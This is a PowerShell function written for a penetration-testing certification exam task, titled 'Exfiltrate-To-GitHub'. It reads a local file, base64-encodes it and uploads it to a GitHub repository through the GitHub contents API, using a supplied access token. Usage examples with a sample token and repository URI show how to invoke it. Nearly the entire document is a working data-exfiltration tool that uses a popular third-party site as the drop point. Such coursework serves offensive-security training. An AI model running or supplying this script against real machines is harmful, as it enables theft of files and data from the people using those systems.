## Powershell For Penetration Testers Exam Task 8 - Use a popular third party website for exfiltration.
function Exfiltrate-To-GitHub
{ 
<#
.SYNOPSIS
A PowerShell script that permits to exfiltrate file to a GitHub repository

.DESCRIPTION
A PowerShell script that use the GitHub API to exfiltrate file from a local computer to a GitHub repository.

.PARAMTER token
The github authentication token
https://github.com/blog/1509-personal-api-tokens

.PARAMTER filename
The file to exfiltrate

.PARAMTER githubURI
The github URI for the exfiltration
https://api.github.com/repos/:owner/:repo/contents/:path (ex. https://api.github.com/repos/salu90/PSFPT/contents/test.exe)

.PARAMTER commitMessage
The commit message

.PARAMTER committerName
The author of the commit

.PARAMTER committerEmail
The email of the author of the commit

.PARAMTER branch
The repository brach of the the commit

.EXAMPLE
PS C:\> . .\Exfiltrate-To-GitHub
PS C:\> Exfiltrate-To-GitHub -token c78d67aaaaaaaa998776545678990s76 -filename .\toUp.txt -githubURI https://api.github.com/repos/salu90/PSFPT/contents/toUploadNew.txt
PS C:\> Exfiltrate-To-GitHub -token c78d67aaaaaaaa998776545678990s76 -filename .\toUp.txt -githubURI https://api.github.com/repos/salu90/PSFPT/contents/toUploadNew.txt -commitMessage test 

.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3190
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
       
       [Parameter(Mandatory = $true)]
       [String]
       $filename,

       [Parameter(Mandatory = $true)]
       [String]
       $githubURI,

       [Parameter(Mandatory = $false)]
       [String]
       $commitMessage = 'defaultCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $committerName = 'defaultCommiter',

       [Parameter(Mandatory = $false)]
       [String]
       $committerEmail = 'defaultEmail@default.com',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
    )




    #gets the content of the file to exfiltrate and converts it to base64
    $fileContent = get-content $filename
    $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
    $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)

    #Sets github parameters for the exfiltration
    $auth = @{"Authorization"="token $token"}
    $committer = @{"name"=$committerName; "email"=$committerEmail}
    $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch}
    $jsonData = ConvertTo-Json $data


    $response = Invoke-WebRequest -Headers $auth -Method PUT -Body $jsonData -Uri $githubURI -UseBasicParsing

    if ($response.StatusCode -eq 201){
        write-host "File uploaded succesfully!" -ForegroundColor Green
    }
    else {
        write-host "Error" -ForegroundColor Red
    }
   

}